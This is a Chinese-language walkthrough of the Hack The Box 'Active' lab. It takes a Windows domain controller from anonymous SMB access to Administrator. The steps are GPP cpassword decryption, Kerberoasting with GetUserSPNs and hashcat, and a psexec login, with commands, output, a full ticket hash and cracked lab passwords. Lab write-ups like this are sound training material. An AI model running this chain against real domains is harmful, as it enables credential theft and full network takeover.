# 信息收集

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# nmap --min-rate 10000 -p- 10.129.16.7
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 18:36 CST
Warning: 10.129.16.7 giving up on port because retransmission cap hit (10).
Nmap scan report for active.htb (10.129.16.7)
Host is up (0.21s latency).
Not shown: 64593 closed tcp ports (reset), 919 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49170/tcp open  unknown
49173/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 30.43 seconds


┌──(.venv)─(root㉿MJ)-[/tmp/test]
└─# nmap -sV -sC -O -p$port 10.129.16.7
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 18:38 CST
Nmap scan report for active.htb (10.129.16.7)
Host is up (0.28s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-07 10:38:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-12-07T10:39:28
|_  start_date: 2025-12-07T09:32:13
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.44 seconds
```

## 域控制器核心服务 (Active Directory)

| **端口**       | **服务**                                           | **作用与渗透意义**                                                                                             |
| ------------ | ------------------------------------------------ | ------------------------------------------------------------------------------------------------------- |
| **53/tcp**   | **DNS (Domain Name System)**                     | **域名解析服务。** 域内所有机器都依赖它将域名解析为 IP 地址。在渗透中用于**区域传输 (Zone Transfer)** 尝试和**枚举**域内主机和子域。                     |
| **88/tcp**   | **Kerberos-Sec**                                 | **Kerberos 认证协议。** 域内用户登录和访问资源时使用的主要认证服务。在渗透中，它是 **Kerberoasting** 和 **AS-REP Roasting** 等黄金/白银票证攻击的基础。 |
| **389/tcp**  | **LDAP (Lightweight Directory Access Protocol)** | **轻量级目录访问协议。** 用于查询和修改 Active Directory 中的用户、组、计算机等对象信息。在渗透中用于**枚举**域结构、用户属性和组策略。                       |
| **464/tcp**  | **Kpasswd5**                                     | **Kerberos 密码更改协议。** 用于用户更改他们的 Kerberos 密码。                                                             |
| **636/tcp**  | **LDAPSSL/LDAPS**                                | **加密的 LDAP 服务。** 提供安全的目录查询。                                                                             |
| **3268/tcp** | **Global Catalog (GC)**                          | **全局编录。** 存储域内所有对象的常用属性，便于快速跨域查询。在大型域环境中非常重要。                                                           |
| **3269/tcp** | **Global Catalog SSL**                           | **加密的全局编录服务。**                                                                                          |
| **9389/tcp** | **ADWS (.NET Message Framing)**                  | **Active Directory Web Services。** 允许 PowerShell 等管理工具远程管理 AD。                                          |
|              |                                                  |                                                                                                         |
## 远程管理与文件共享服务

|               |                                   |                                                                                                                             |
| ------------- | --------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| **135/tcp**   | **MSRPC (Microsoft Windows RPC)** | **远程过程调用。** 客户端/服务器通信机制，许多 Windows 服务（包括 AD 相关的）依赖它来建立连接并协商端口。在渗透中常用于**枚举**服务。                                              |
| **139/tcp**   | **NetBIOS-SSN**                   | **NetBIOS 会话服务。** 较旧的文件共享协议，与 SMB 协议相关联。                                                                                    |
| **445/tcp**   | **Microsoft-DS**                  | **SMB (Server Message Block)。** 现代 Windows 的主要文件共享和打印机共享协议。                                                                 |
| **593/tcp**   | **HTTP-RPC-EPMAP (ncacn_http)**   | **RPC over HTTP。** 允许 RPC 流量通过 HTTP 代理或防火墙。通常与 Microsoft Exchange 或其他远程管理工具相关。                                              |
| **5722/tcp**  | **MSRPC**                         | **DFS Replication (DFSR)。** 分布式文件系统复制服务                                                                                     |
| **47001/tcp** | **HTTP (Microsoft HTTPAPI)**      | **Windows Remote Management (WinRM) / SSDP/UPnP 相关。** 虽然 Nmap 首次推断它是 `winrm`，但你的详细扫描显示它是通用的 **Microsoft HTTPAPI httpd 2.0** |
|               |                                   |                                                                                                                             |
实话是第一次打AD域，看见脑子就懵逼了，打完其实还是懵的，不过多了就好了

先smb入手吧

# 立足点
## smb

有部分共享
```bash
┌──(.venv)─(root㉿MJ)-[/tmp/test]
└─# smbclient -L 10.129.16.7 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.16.7 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

enum4linux跑一手看看，主要看看哪个能看吧
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# enum4linux -a 10.129.16.7
//10.129.16.7/ADMIN$    Mapping: DENIED Listing: N/A Writing: N/A
//10.129.16.7/C$        Mapping: DENIED Listing: N/A Writing: N/A
//10.129.16.7/IPC$      Mapping: OK Listing: DENIED Writing: N/A
//10.129.16.7/NETLOGON  Mapping: DENIED Listing: N/A Writing: N/A
//10.129.16.7/Replication       Mapping: OK Listing: OK Writing: N/A
//10.129.16.7/SYSVOL    Mapping: DENIED Listing: N/A Writing: N/A
//10.129.16.7/Users     Mapping: DENIED Listing: N/A Writing: N/A
```
Replication可以匿名拿，这共享了个Users，要是能拿到凭据，能找flag

这个目录很深，直接能下的都下下来

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# smbclient //10.129.16.7/Replication
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> recurse ON       开递归
smb: \> prompt OFF       禁用下载提示
smb: \> mget *           全下

┌──(root㉿MJ)-[/tmp/test/active.htb]
└─# find ./ -type f
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI
./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
```
找一下文件，第一个就有加密密码
```bash
┌──(root㉿MJ)-[/tmp/test/active.htb]
└─# cat ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
问手ai就知道是
**Windows 组策略首选项 (Group Policy Preferences, GPP)** 文件

这个加密机制是 **AES-256**，但微软在所有版本的 GPP 中都使用了**硬编码（Hardcoded）的对称密钥**。这意味着只要你知道这个密钥，你就可以解密任何 GPP 文件中的 `cpassword`

```bash
┌──(root㉿MJ)-[/tmp/test/active.htb]
└─# gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```
直接就解出来了，不过靶机没开3389和5985，可以用这个用户smb连上拿个user

RDP (3389/tcp)**远程桌面登录。Remote Desktop Users** 组成员
**WinRM (5985/tcp)通过 PowerShell 远程执行命令。Remote Management Users** 组成员



## 提权
`GetUserSPNs` 脚本能找出和普通用户账户关联的 **SPN**，并以 **JtR (John the Ripper)** 和 **Hashcat** 兼容的格式输出。

简单的说，当前用户通过 **GetUserSPNs** 查询服务和用户之间的关联，尤其是 **admin** 用户所管理的服务。如果**admin**用户的配置存在漏洞（例如，禁用了预身份验证，或者是注册了服务账户），那么工具就能够抓取到加密的密码哈希，进一步可以进行密码破解。

```bash
┌──(.venv)─(root㉿MJ)-[/tmp/test]
└─# GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -request -dc-ip 10.129.16.7  Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 03:06:40.351723  2025-12-07 17:33:09.194530



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d03a216bd503e4eff6c12636d47af10f$698bbec4d88e9fe4bb78f1c53454ffcca88cafeb09a66246e37706b50e0d2691a2d2fb573b5730f402378b39ef883668fd64a942063b178ef52989687f5eebdc4a9bed89d83b9957725aebb935043ea0da949bbdf54987d67222d10858e6c22e2a3c93802008ce8f5bf52dcc0b42b3071aa3caf5830f91b7c7344d4ea72c8cda4b3415a9e175fabe4c30ea52452338bb252d36eca7713c51466b88cb09f0c2418ecd70cf57a463ffb346582e1867b39633acff87baa87b503554a9b9cba14120d7926c8deb5c702459f821050415369627bd2a04094a765d2d91c59a7bd287b4e851782a860e843836e6ea0a1e8da68a141628066af43f50081e600323d89c90e18850235d75b16ee1d2db70f218e83c5e1813158c2f8ea1297c43e1af699d88e8cc8ad38b0ee1f0148d88e80e415ecea052432418444b0f575cb947a87af7247809bd9003dd7dc5671394573435382034657a4090b58b0fe5a915ea0dcbbeccc661118ac08bf2ee56c6ee43ae7eaf06991cb2c4dbc7326a47b9847d619604fff0bbf22f3576a97f370ebddaa2209e8cb42695af5b8e0ba39201caa7b728501f4007c0247b01790e9ad424e359d5ebcad66bc2779485cf65415436d63d5fdbb737def139cda0a46fd9d8fc51b5b958a56cb4f7121812a6ca5450268fb738e1676825ed21780a46bebb42b7f50e3a7b158e684a7ed42bf2ecc07a383720f518d47d37657caa1577a1c14d39a277e453e4d208b54028605b96e95c3d98c856b831ec61ba54734adef9552b5c6374ca65e5f89c781537e3b3fcbdd7743ba3b666ead95939f80adf0a19832299a947f5e9f6b3b4960fbc262d605d58cfaeec926ff145d8089b9623b7a804344eaee615cb89c7774ca23afe34b8aaab9227cd872321b5298768df2ad12cae97920ba73547be209eb0407824fe95e07faae0a5c060eea5b2c8518f44c63b9c1b76eb8f53c337d62dda04545f399fd31d95b51a10b174c8d78000c6372409953aab81bec626f1fa8c5133c9d18a6034fea98079df4175b0236399d8251bb3ff125a153910e7a5870071821a7db7817005e1f4a98f2fd946d30b489393a8925c335caccfceaa20a481a8f30a381c11eab44766ba03c1e20cc109f414b26b9b59d51f520cdce6e27aab14d34361378dfbf949234496f443a7f00c1a176d40790f58ff159cbaf9e630102bc5714283db5aee9f0e88210c9ad0da88f2674cde60a58ae9b61bb79884d3c99c4a93e1be94693f
```
这里就是配置不当，admin被注册了445的服务账户，所以通过**SPN**抓到了密码hash
```bash
┌──(.venv)─(root㉿MJ)-[/tmp/test]
└─# hashcat -m 13100 hash.txt --show
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d03a216bd503e4eff6c12636d47af10f$698bbec4d88e9fe4bb78f1c53454ffcca88cafeb09a66246e37706b50e0d2691a2d2fb573b5730f402378b39ef883668fd64a942063b178ef52989687f5eebdc4a9bed89d83b9957725aebb935043ea0da949bbdf54987d67222d10858e6c22e2a3c93802008ce8f5bf52dcc0b42b3071aa3caf5830f91b7c7344d4ea72c8cda4b3415a9e175fabe4c30ea52452338bb252d36eca7713c51466b88cb09f0c2418ecd70cf57a463ffb346582e1867b39633acff87baa87b503554a9b9cba14120d7926c8deb5c702459f821050415369627bd2a04094a765d2d91c59a7bd287b4e851782a860e843836e6ea0a1e8da68a141628066af43f50081e600323d89c90e18850235d75b16ee1d2db70f218e83c5e1813158c2f8ea1297c43e1af699d88e8cc8ad38b0ee1f0148d88e80e415ecea052432418444b0f575cb947a87af7247809bd9003dd7dc5671394573435382034657a4090b58b0fe5a915ea0dcbbeccc661118ac08bf2ee56c6ee43ae7eaf06991cb2c4dbc7326a47b9847d619604fff0bbf22f3576a97f370ebddaa2209e8cb42695af5b8e0ba39201caa7b728501f4007c0247b01790e9ad424e359d5ebcad66bc2779485cf65415436d63d5fdbb737def139cda0a46fd9d8fc51b5b958a56cb4f7121812a6ca5450268fb738e1676825ed21780a46bebb42b7f50e3a7b158e684a7ed42bf2ecc07a383720f518d47d37657caa1577a1c14d39a277e453e4d208b54028605b96e95c3d98c856b831ec61ba54734adef9552b5c6374ca65e5f89c781537e3b3fcbdd7743ba3b666ead95939f80adf0a19832299a947f5e9f6b3b4960fbc262d605d58cfaeec926ff145d8089b9623b7a804344eaee615cb89c7774ca23afe34b8aaab9227cd872321b5298768df2ad12cae97920ba73547be209eb0407824fe95e07faae0a5c060eea5b2c8518f44c63b9c1b76eb8f53c337d62dda04545f399fd31d95b51a10b174c8d78000c6372409953aab81bec626f1fa8c5133c9d18a6034fea98079df4175b0236399d8251bb3ff125a153910e7a5870071821a7db7817005e1f4a98f2fd946d30b489393a8925c335caccfceaa20a481a8f30a381c11eab44766ba03c1e20cc109f414b26b9b59d51f520cdce6e27aab14d34361378dfbf949234496f443a7f00c1a176d40790f58ff159cbaf9e630102bc5714283db5aee9f0e88210c9ad0da88f2674cde60a58ae9b61bb79884d3c99c4a93e1be94693f:Ticketmaster1968
```
很容易就拿到admin的凭据了，psexec就能上终端

### SY这个用户不能上的原因是
#### 1. 写入管理共享的权限（`ADMIN$` 和 `C$`）

- **`psexec.py` 的工作原理：** 为了在远程机器上执行命令，`psexec.py` 需要将一个临时的服务可执行文件（`.exe`）上传到目标机器上，通常是上传到 **`ADMIN$`** 或 **`C$`** 这些管理共享中。
    
- **权限需求：** 只有 **本地管理员 (Local Administrators)** 组的成员才有权限写入这些管理共享。
    
	 `psexec.py` 输出中已经清晰地显示了这一点：
- 
    ```
    [-] share 'ADMIN$' is not writable.
    [-] share 'C$' is not writable.
    ```
    
    这证实了 `SVC_TGS` 账户不属于目标域控制器上的本地管理员组。
    

#### 2. 远程服务创建和启动的权限

- **`psexec.py` 的下一步：** 上传文件成功后，`psexec.py` 会通过 **DCE/RPC** 协议连接到 Windows 的服务控制管理器（SCM）。
    
- **权限需求：** 它需要权限来**注册**和**启动**一个新服务（即你上传的那个 `.exe` 文件）。
    
- **结果：** 同样地，只有本地管理员或具有特定服务管理权限的用户才能执行这些操作。`SVC_TGS` 不具备这些权限，导致执行失败。


```bash
┌──(.venv)─(root㉿MJ)-[/tmp/test]
└─# psexec.py active.htb/Administrator:Ticketmaster1968@10.129.16.7
```
连上即可拿到root


# 总结

虽然是台AD域，但是其实很简单，主要是对windows以及域不够熟悉，所以开始看起来会比较懵一点，不过复盘一下，其实也就

**smb->SPN拿票据->hashcat->psexec远程登录下**，熟悉的话，宝宝靶机